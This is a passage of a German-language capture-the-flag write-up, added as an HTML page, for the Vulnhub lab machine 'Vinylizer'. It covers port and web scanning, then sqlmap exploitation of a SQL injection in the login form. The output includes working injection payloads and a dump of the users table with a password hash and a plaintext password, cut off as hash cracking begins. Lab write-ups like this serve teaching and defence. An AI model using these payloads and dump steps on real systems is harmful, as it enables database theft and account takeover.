@@ -1,0 +1,798 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vinylizer - Vulnhub - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+<body>
+ <div class="nav-wrapper">
+    <div class="hamburger-nav-wrapper">
+        <input type="checkbox" id="hamburger-toggle">
+        <label id="hamburger-button" for="hamburger-toggle" aria-label="Menü öffnen">
+            <div class="bar"></div>
+            <div class="bar"></div>
+            <div class="bar"></div>
+        </label>
+        <nav class="navbar" id="main-nav">
+            <a href="../../aboutme.html">Über mich</a>
+            <a href="../../index.html">HackMyVM</a>
+            <a href="../../vulnyx.html">Vulnyx</a>
+            <a href="../../vulnhub.html">Vulnhub</a>
+        </nav>
+  </div></div>
+    <div class="header-bg">
+        <h1>Vinylizer - Vulnhub - Level: Easy - Bericht</h1>
+        <div class="level-container">
+            <h2>Easy</h2> <!-- Farbe Rot explizit für diesen Bericht gewünscht -->
+            <div class="circle">
+                <div class="segment segment-1"></div> <!-- Segmente werden durch CSS gefärbt, hier rot -->
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div> <!-- Innerer Kreis passend zur Header-Farbe (via CSS) -->
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">Burp Suite</div>
+                <div class="tool-item">sqlmap</div>
+                <div class="tool-item">hashcat</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">python3</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">echo</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">cd</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">ll</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#poc">Proof of Concept (Privilege Escalation Path)</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+192.168.2.113	08:00:27:6d:ec:17	PCS Systemtechnik GmbH
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `arp-scan -l` wird verwendet, um das lokale Netzwerk (Local Area Network, LAN) nach aktiven Geräten zu durchsuchen. Er sendet ARP-Anfragen (Address Resolution Protocol) an alle möglichen IP-Adressen im lokalen Subnetz und listet die Geräte auf, die antworten, zusammen mit ihrer IP-Adresse und MAC-Adresse. Die MAC-Adresse kann Hinweise auf den Hersteller des Netzwerkadapters geben.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dieser Schritt ist fundamental in der Reconnaissance-Phase. Er hat erfolgreich die IP-Adresse `192.168.2.113` als aktives Ziel im Netzwerk identifiziert. Die MAC-Adresse `08:00:27:6d:ec:17` deutet auf eine VirtualBox-Umgebung hin (`PCS Systemtechnik GmbH` ist oft mit VirtualBox assoziiert), was nützliche Kontextinformation ist.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Immer `arp-scan` oder ähnliche Tools (wie `netdiscover`) zu Beginn eines internen Tests verwenden, um aktive Ziele schnell zu finden. Die identifizierte IP wird das primäre Ziel für weitere Scans sein.
+            <br><strong>Empfehlung (Admin):</strong> Netzwerk-Monitoring implementieren, um ungewöhnliche ARP-Scan-Aktivitäten zu erkennen. Sicherstellen, dass nur autorisierte Geräte im Netzwerk aktiv sind.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi /etc/hosts</span></div>
+                     <pre>
+# Inhalt der /etc/hosts Datei nach der Bearbeitung:
+127.0.0.1	localhost
+192.168.2.113   Vinylizer.hmv
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Befehl `vi /etc/hosts` öffnet die lokale Hosts-Datei im Texteditor `vi`. In dieser Datei können manuell Zuordnungen von IP-Adressen zu Hostnamen vorgenommen werden. Hier wird der Eintrag `192.168.2.113 Vinylizer.hmv` hinzugefügt. Dies ermöglicht es dem Pentester-System, die IP-Adresse `192.168.2.113` über den benutzerfreundlichen Namen `Vinylizer.hmv` anzusprechen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein wichtiger vorbereitender Schritt, insbesondere wenn Webanwendungen auf dem Zielsystem über virtuelle Hosts konfiguriert sind oder wenn man während des Tests konsistente Hostnamen verwenden möchte. Es vereinfacht die Adressierung des Ziels in nachfolgenden Befehlen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Hosts-Datei zu bearbeiten ist eine bewährte Methode, um die Interaktion mit Zielen zu vereinfachen, die Hostnamen erwarten oder verwenden. Dies sollte früh im Prozess erfolgen, nachdem die IP identifiziert wurde.
+             <br><strong>Empfehlung (Admin):</strong> Dieser Schritt betrifft nur die lokale Konfiguration des Angreifersystems und hat keine direkten defensiven Implikationen für das Zielsystem. Es ist jedoch wichtig zu verstehen, dass Angreifer Hostnamen verwenden können, um auf Dienste zuzugreifen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nikto -h http://192.168.2.113</span></div>
+                    <pre>
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.113
++ Target Hostname:    192.168.2.113
++ Target Port:        80
++ Start Time:         2024-04-29 22:59:27 (GMT2)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.52 (Ubuntu)
++ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
++ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ /: Server may leak inodes via ETags, header found with file /, inode: 916, size: 60f60f431ef12, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
++ Apache/2.4.52 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EL for the 2.x branch.
++ /login.php: Cookie PHPSESSID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
++ OPTIONS: Allowed HTTP Methods: GET, POST, OPTIONS, HEAD .
++ /img/: Directory indexing found.
++ /img/: This might be interesting.
++ /login.php: Admin login page/section found.
++ 8102 requests: 0 error(s) and 9 item(s) reported on remote host
++ End Time:           2024-04-29 22:59:37 (GMT2) (10 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> `nikto` ist ein Webserver-Scanner, der nach bekannten Schwachstellen, Konfigurationsfehlern, veralteten Softwareversionen und anderen potenziell sicherheitsrelevanten Informationen sucht. Der Befehl `nikto -h http://192.168.2.113` scannt den Webserver auf Port 80 der Ziel-IP.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan liefert wertvolle Informationen:
+                <ul>
+                    <li>Server-Software: Apache/2.4.52 (Ubuntu), als veraltet markiert.</li>
+                    <li>Fehlende Sicherheitsheader: `X-Frame-Options` (Clickjacking-Risiko) und `X-Content-Type-Options` (MIME-Sniffing-Risiko).</li>
+                    <li>Mögliches ETag-Inode-Leak (CVE-2003-1418), was Informationen über die Serverstruktur preisgeben könnte.</li>
+                    <li>PHPSESSID-Cookie ohne `HttpOnly`-Flag in `/login.php`, was das Cookie anfällig für Diebstahl durch Cross-Site Scripting (XSS) macht.</li>
+                    <li>Verzeichnisauflistung (Directory Indexing) im `/img/`-Ordner, was die Struktur offenlegt und möglicherweise Zugriff auf unerwartete Dateien ermöglicht.</li>
+                    <li>Identifizierung einer Login-Seite `/login.php`.</li>
+                </ul>
+            Diese Ergebnisse deuten auf mehrere Bereiche hin, die weiter untersucht werden sollten, insbesondere die Login-Seite und die veraltete Apache-Version.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die identifizierten Punkte (Login-Seite, Directory Indexing, fehlende Header, veraltete Software) sollten priorisiert und weiter untersucht werden. Prüfe `/img/` manuell und konzentriere dich auf die `/login.php` für mögliche Authentifizierungs-Schwachstellen (z.B. SQL-Injection, Brute-Force).
+            <br><strong>Empfehlung (Admin):</strong> Sicherheitsheader (`X-Frame-Options`, `X-Content-Type-Options`, `Content-Security-Policy`) implementieren. `HttpOnly`-Flag für Session-Cookies setzen. Directory Indexing deaktivieren. Apache-Server auf die neueste stabile Version aktualisieren. ETag-Konfiguration überprüfen, um Informationslecks zu vermeiden.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sV -A -T5 192.168.2.113 -p- | grep open</span></div>
+                     <pre>
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Dieser `nmap`-Befehl führt einen schnellen Scan durch, um nur die offenen Ports des Ziels anzuzeigen.
+                <ul>
+                    <li>`-sS`: Führt einen SYN-Scan (Stealth Scan) durch, der oft weniger auffällig ist als ein vollständiger TCP-Connect-Scan.</li>
+                    <li>`-sV`: Versucht, die Version der Dienste zu ermitteln, die auf den offenen Ports laufen.</li>
+                    <li>`-A`: Aktiviert die Betriebssystemerkennung, Versionserkennung, Skript-Scanning und Traceroute.</li>
+                    <li>`-T5`: Setzt das Timing-Template auf "insane" für einen sehr schnellen Scan (potenziell ungenauer und auffälliger).</li>
+                    <li>`-p-`: Scannt alle 65535 TCP-Ports.</li>
+                    <li>`| grep open`: Filtert die Ausgabe, um nur Zeilen anzuzeigen, die das Wort "open" enthalten, also die offenen Ports.</li>
+                </ul></p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dieser Scan bestätigt schnell die Ergebnisse des vorherigen `nikto`-Scans (Port 80/HTTP) und identifiziert zusätzlich einen offenen SSH-Port (22). Die Versionsinformationen (OpenSSH 8.9p1, Apache 2.4.52) sind konsistent. Die Verwendung von `grep open` ist eine effiziente Methode, um sich einen schnellen Überblick über offene Ports zu verschaffen, bevor man die detaillierte Ausgabe analysiert.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Dieser schnelle Scan ist gut für einen ersten Überblick. Notiere die offenen Ports (22/SSH, 80/HTTP) und die erkannten Versionen für weitere gezielte Angriffe oder Enumeration. Der detailliertere `nmap`-Scan ohne `grep` sollte ebenfalls analysiert werden.
+             <br><strong>Empfehlung (Admin):</strong> Überprüfen, ob beide Dienste (SSH, HTTP) tatsächlich öffentlich zugänglich sein müssen. Zugriff auf SSH sollte idealerweise auf bestimmte IP-Adressen beschränkt oder durch Firewalls gefiltert werden. Halten Sie die Software (OpenSSH, Apache) aktuell.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sV -A -T5 192.168.2.113 -p-</span></div>
+                    <pre>
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-29 22:59 CEST
+Nmap scan report for Vinylizer.hmv (192.168.2.113)
+Host is up (0.00017s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 f8:e3:79:35:12:8b:e7:41:d4:27:9d:97:a5:14:b6:16 (ECDSA)
+|_  256 e3:8b:15:12:6b:ff:97:57:82:e5:20:58:2d:cb:55:33 (ED25519)
+80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
+|_http-title: Vinyl Records Marketplace
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+MAC Address: 08:00:27:6D:EC:17 (Oracle VirtualBox virtual NIC)
+Aggressive OS guesses: Linux 5.0 - 5.4 (99%), Linux 4.15 - 5.8 (96%), Linux 2.6.32 - 3.13 (96%), Linux 5.0 - 5.5 (95%), Linux 5.1 (95%), Linux 3.10 (95%), Linux 2.6.22 - 2.6.36 (94%), Linux 3.10 - 4.11 (94%), Linux 2.6.32 (93%), Linux 3.2 - 4.9 (93%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.17 ms Vinylizer.hmv (192.168.2.113)
+
+Nmap done: 1 IP address (1 host up) scanned in 12.34 seconds
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Dies ist die vollständige Ausgabe des vorherigen `nmap`-Befehls ohne die Filterung durch `grep`. Sie enthält detailliertere Informationen:
+                <ul>
+                    <li>**Port 22 (SSH):** Zeigt die Version OpenSSH 8.9p1 und die Host-Schlüssel an.</li>
+                    <li>**Port 80 (HTTP):** Zeigt die Apache-Version 2.4.52, den Seitentitel "Vinyl Records Marketplace" und den Server-Header.</li>
+                    <li>**MAC-Adresse:** Bestätigt die VirtualBox-Umgebung.</li>
+                    <li>**Betriebssystemerkennung:** Nmap schätzt das Betriebssystem als Linux ein (verschiedene Kernel-Versionen), kann aber keine exakte Übereinstimmung finden.</li>
+                    <li>**Traceroute:** Zeigt, dass das Ziel nur einen Netzwerk-Hop entfernt ist, was typisch für ein lokales Netzwerk ist.</li>
+                </ul></p>
+            <p class="evaluation"><strong>Bewertung:</strong> Diese detaillierte Ausgabe bestätigt und erweitert die bisherigen Erkenntnisse. Die SSH-Host-Schlüssel können potenziell zur Fingerabdruckerkennung verwendet werden. Der Titel der Webseite ("Vinyl Records Marketplace") gibt einen klaren Hinweis auf den Zweck der Anwendung. Die OS-Erkennung ist nicht präzise, bestätigt aber Linux als Basis. Die Konsistenz der Ergebnisse (Ports, Versionen) erhöht das Vertrauen in die gesammelten Informationen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutze die detaillierten Versionsinformationen (SSH, Apache), um nach bekannten Exploits (z.B. via `searchsploit`) zu suchen. Untersuche die Webanwendung auf Port 80 genauer, beginnend mit der Startseite und der zuvor identifizierten `/login.php`. Brute-Force-Angriffe auf SSH könnten versucht werden, wenn Benutzerlisten verfügbar werden, sind aber oft zeitaufwendig und laut.
+            <br><strong>Empfehlung (Admin):</strong> Halten Sie Betriebssystem und Dienste aktuell. Überwachen Sie SSH-Logins auf fehlgeschlagene Versuche. Konfigurieren Sie den Webserver so, dass möglichst wenig detaillierte Versionsinformationen preisgegeben werden (obwohl dies oft nur "Security through Obscurity" ist).</p>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://vinylizer.hmv -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx,bak,js -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"  -b '403,404' -e --no-error -k</span></div>
+                    <pre>
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://vinylizer.hmv
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   403,404
+[+] User Agent:              gobuster/3.6
+[+] Expanded:                true
+[+] Extensions:              txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx,bak,js
+[+] Ignore TLS certificate errors: true
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+http://vinylizer.hmv/index.html           (Status: 200) [Size: 2326]
+http://vinylizer.hmv/img                  (Status: 301) [Size: 312] [--> http://vinylizer.hmv/img/]
+http://vinylizer.hmv/login.php            (Status: 200) [Size: 1408]
+
+===============================================================
+Finished
+===============================================================
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> `gobuster` ist ein Werkzeug zur Brute-Force-Ermittlung von Verzeichnissen und Dateien auf Webservern.
+                <ul>
+                    <li>`dir`: Gibt an, dass der Verzeichnis/Datei-Brute-Force-Modus verwendet wird.</li>
+                    <li>`-u http://vinylizer.hmv`: Definiert die Ziel-URL.</li>
+                    <li>`-x ...`: Eine umfangreiche Liste von Dateierweiterungen, nach denen zusätzlich gesucht werden soll (z.B. `index.php`, `config.txt`).</li>
+                    <li>`-w ...`: Gibt die Wortliste an, die für das Erraten von Verzeichnis- und Dateinamen verwendet wird (hier eine gängige Liste aus SecLists).</li>
+                    <li>`-b '403,404'`: Ignoriert Antworten mit den HTTP-Statuscodes 403 (Forbidden) und 404 (Not Found).</li>
+                    <li>`-e`: Erweitert die Suche, sodass auch Verzeichnisse ohne abschließenden Schrägstrich gefunden werden.</li>
+                    <li>`--no-error`: Unterdrückt Fehlermeldungen im Output.</li>
+                    <li>`-k`: Ignoriert TLS/SSL-Zertifikatsfehler (hier nicht relevant, da HTTP verwendet wird).</li>
+                </ul></p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der `gobuster`-Scan bestätigt die bereits bekannten Pfade `/index.html` und `/login.php`. Er findet außerdem das Verzeichnis `/img`, das mit einem Statuscode 301 (Moved Permanently) auf `/img/` weiterleitet. Dies korreliert mit dem `nikto`-Ergebnis, das Directory Indexing für `/img/` gemeldet hat. Obwohl keine neuen, versteckten Pfade gefunden wurden, ist dieser Schritt wichtig, um sicherzustellen, dass keine offensichtlichen, ungeschützten Ressourcen übersehen wurden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Obwohl dieser Scan keine neuen Angriffspunkte offenbarte, ist Directory Brute-Forcing ein Standardverfahren. Untersuche das `/img/`-Verzeichnis manuell auf interessante Dateien. Fokussiere dich weiterhin auf `/login.php`. Versuche eventuell aggressivere Wortlisten oder andere Brute-Force-Tools (wie `ffuf` oder `dirsearch`), falls der Verdacht besteht, dass komplexere Pfade existieren.
+            <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass keine sensiblen Dateien oder Verzeichnisse öffentlich zugänglich sind. Konfigurieren Sie den Webserver so, dass er bei nicht existierenden Ressourcen immer einen 404-Fehler zurückgibt und keine Verzeichnisauflistung erlaubt. Implementieren Sie ggf. Web Application Firewalls (WAFs), um Brute-Force-Scans zu erkennen und zu blockieren.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">[Burp Suite Request/Response Capture]</div>
+                    <pre>
+POST /login.php HTTP/1.1
+Host: vinylizer.hmv
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: de,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 35
+Origin: http://vinylizer.hmv
+Connection: close
+Referer: http://vinylizer.hmv/login.php
+Cookie: PHPSESSID=ifkmb2a7ifmdj1o6m0va5ts01s
+Upgrade-Insecure-Requests: 1
+
+username=admin&password=pass&login=
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Dieser Code-Block zeigt einen abgefangenen HTTP-POST-Request an die `/login.php`-Seite, wahrscheinlich mittels eines Intercepting Proxies wie Burp Suite oder OWASP ZAP. Der Request sendet Formulardaten (`application/x-www-form-urlencoded`) mit den Parametern `username=admin`, `password=pass` und einem leeren `login`-Parameter. Dies ist ein typischer Versuch, sich mit Standard- oder geratenen Zugangsdaten anzumelden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Abfangen und Analysieren von Login-Requests ist entscheidend für das Verständnis des Authentifizierungsmechanismus. Es zeigt die verwendeten Parameter (`username`, `password`, `login`) und das Format der Datenübertragung. Diese Informationen sind essentiell für weitere Angriffe wie Brute-Force, Credential Stuffing oder SQL-Injection-Tests an den Login-Parametern.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Senden Sie diesen Request an Werkzeuge wie den Burp Intruder oder `sqlmap`. Testen Sie die Parameter `username` und `password` auf SQL-Injection-Schwachstellen. Versuchen Sie Brute-Force-Angriffe auf das Passwort für bekannte oder vermutete Benutzernamen (z.B. `admin`, `shopadmin`).
+            <br><strong>Empfehlung (Admin):</strong> Implementieren Sie Schutzmechanismen gegen Brute-Force-Angriffe (z.B. Account Lockout nach mehreren Fehlversuchen, Captchas). Validieren und sanitisieren Sie alle Benutzereingaben serverseitig, um SQL-Injection zu verhindern (Prepared Statements verwenden). Erzwingen Sie starke Passwörter und verbieten Sie gebräuchliche oder Standard-Passwörter.</p>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">sqlmap -r /home/cyber/Downloads/ben2.sql --dbs --batch --risk 3 --level 3</span></div>
+                    <pre>
+[...]
+[23:13:17] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 22.04 (jammy)
+web application technology: Apache 2.4.52
+back-end DBMS: MySQL >= 5.0.12
+[23:13:17] [INFO] fetching database names
+[23:13:17] [INFO] fetching number of databases
+[23:13:17] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
+[23:13:17] [INFO] retrieved: 3
+[23:13:17] [INFO] retrieved: information_schema
+[23:13:17] [INFO] retrieved: performance_schema
+[23:13:18] [INFO] retrieved: vinyl_marketplace
+available databases [3]:
+[*] information_schema
+[*] performance_schema
+[*] vinyl_marketplace
+[...]
+sqlmap identified the following injection point(s) with a total of [...] HTTP(s) requests:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: username=admin' AND 8493=8493 AND 'slYi'='slYi&password=pass&login=
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: username=admin' AND (SELECT 0 FROM (SELECT COUNT(*),CONCAT(0x71627a7a71,(SELECT (ELT(7410=7410,1))),0x7178767871,FLOOR(RAND(0)*2))x FROM information_schema.character_sets GROUP BY x)a) AND 'gYZP'='gYZP&password=pass&login=
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=admin' AND (SELECT 5869 FROM (SELECT(SLEEP(5)))XpZZ) AND 'cFJd'='cFJd&password=pass&login=
+---
+[...]
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> `sqlmap` ist ein automatisiertes Tool zur Erkennung und Ausnutzung von SQL-Injection-Schwachstellen.
+                <ul>
+                    <li>`-r /home/cyber/Downloads/ben2.sql`: Lädt die HTTP-Request-Details aus einer Datei (vermutlich der zuvor mit Burp Suite gespeicherte Login-Request). Dies ist oft einfacher, als alle Header und Parameter manuell anzugeben.</li>
+                    <li>`--dbs`: Weist `sqlmap` an, die Namen aller verfügbaren Datenbanken auf dem Server aufzulisten.</li>
+                    <li>`--batch`: Führt `sqlmap` im nicht-interaktiven Modus aus und verwendet Standardantworten für die meisten Fragen.</li>
+                    <li>`--risk 3 --level 3`: Erhöht das Risiko und die Tiefe der durchgeführten Tests. Höhere Level und Risiken testen mehr Payload-Varianten und potenziell gefährlichere SQL-Konstrukte, was die Erkennungswahrscheinlichkeit erhöht, aber auch die Serverlast steigern kann.</li>
+                </ul>
+            Die Ausgabe zeigt, dass `sqlmap` erfolgreich eine SQL-Injection-Schwachstelle im Parameter `username` des POST-Requests identifiziert hat. Es wurden verschiedene Typen von SQL-Injection erkannt (boolean-based blind, error-based, time-based blind). Das Backend-DBMS wurde als MySQL (Version >= 5.0.12) identifiziert.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein kritischer Fund! Eine SQL-Injection-Schwachstelle im Login-Formular ermöglicht es, die Datenbank des Webservers zu manipulieren und auszulesen. `sqlmap` hat die Schwachstelle nicht nur gefunden, sondern auch das Datenbanksystem und die Betriebssystem-Informationen extrahiert. Es wurden drei Datenbanken gefunden: `information_schema` (eine Standard-Metadatenbank von MySQL), `performance_schema` (eine weitere Standard-MySQL-Datenbank zur Leistungsüberwachung) und `vinyl_marketplace` (die anwendungsspezifische Datenbank, die wahrscheinlich die interessanten Daten enthält).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Datenbank `vinyl_marketplace` ist das nächste Ziel. Verwende `sqlmap` weiter, um die Tabellen und anschließend die Daten (insbesondere Benutzerdaten/Passwörter) aus dieser Datenbank zu extrahieren.
+            <br><strong>Empfehlung (Admin):</strong> **Höchste Priorität!** Die SQL-Injection-Schwachstelle muss sofort behoben werden. Verwenden Sie parametrisierte Abfragen (Prepared Statements) in der Webanwendung, um Benutzereingaben sicher an die Datenbank zu übergeben. Validieren und sanitisieren Sie alle Eingaben serverseitig. Überprüfen Sie den gesamten Code auf ähnliche Schwachstellen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">sqlmap -r /home/cyber/Downloads/ben2.sql --batch -D vinyl_marketplace --tables</span></div>
+                    <pre>
+[...]
+[23:14:21] [INFO] fetching tables for database 'vinyl_marketplace'
+[...]
+[23:14:21] [INFO] retrieved: 1
+[23:14:21] [INFO] retrieved: users
+Database: vinyl_marketplace
+[1 table]
++-------+
+| users |
++-------+
+[...]
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Dieser `sqlmap`-Befehl baut auf dem vorherigen auf.
+                <ul>
+                    <li>`-r ... --batch`: Wie zuvor wird der gespeicherte Request im Batch-Modus verwendet.</li>
+                    <li>`-D vinyl_marketplace`: Spezifiziert die Zieldatenbank, die im vorherigen Schritt identifiziert wurde.</li>
+                    <li>`--tables`: Weist `sqlmap` an, die Namen aller Tabellen innerhalb der Datenbank `vinyl_marketplace` aufzulisten.</li>
+                </ul></p>
+            <p class="evaluation"><strong>Bewertung:</strong> Erfolg! `sqlmap` konnte die Struktur der Datenbank `vinyl_marketplace` weiter auslesen und hat eine Tabelle namens `users` identifiziert. Diese Tabelle enthält höchstwahrscheinlich die Benutzerkonten und Zugangsdaten für die Webanwendung.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der nächste logische Schritt ist, den Inhalt der `users`-Tabelle auszulesen (`--dump`).
+            <br><strong>Empfehlung (Admin):</strong> Die Behebung der SQL-Injection-Schwachstelle bleibt die Hauptpriorität. Solange die Schwachstelle besteht, können Angreifer potenziell auf alle Daten in der `vinyl_marketplace`-Datenbank zugreifen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">sqlmap -r /home/cyber/Downloads/ben2.sql --batch -D vinyl_marketplace -T users --dump</span></div>
+                    <pre>
+[...]
+[23:14:53] [INFO] fetching columns for table 'users' in database 'vinyl_marketplace'
+[...]
+[23:14:53] [INFO] retrieved: 4
+[23:14:53] [INFO] retrieved: id
+[23:14:53] [INFO] retrieved: login_attempts
+[23:14:53] [INFO] retrieved: password
+[23:14:53] [INFO] retrieved: username
+[23:14:53] [INFO] fetching entries for table 'users' in database 'vinyl_marketplace'
+[...]
+[23:14:53] [INFO] retrieved: 2
+[23:14:54] [INFO] retrieved: 1 | <span class="password">9432522ed1a8fca612b11c3980a031f6</span> | shopadmin | 0
+[23:14:55] [INFO] retrieved: 2 | <span class="password">password123</span>                      | lana      | 0
+[...]
+[23:14:55] [INFO] recognized possible password hashes in column 'password'
+do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
+do you want to crack them via a dictionary-based attack? [Y/n/q] Y
+[23:14:55] [INFO] using hash method 'md5_generic_passwd'
+what dictionary do you want to use?
+[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
+[2] custom dictionary file
+[3] file with list of dictionary files
+> 1
+[23:14:55] [INFO] using default dictionary
+do you want to use common password suffixes? (slow!) [y/N] N
+[23:14:55] [INFO] starting dictionary-based cracking (md5_generic_passwd)
+[23:14:55] [INFO] starting 16 processes
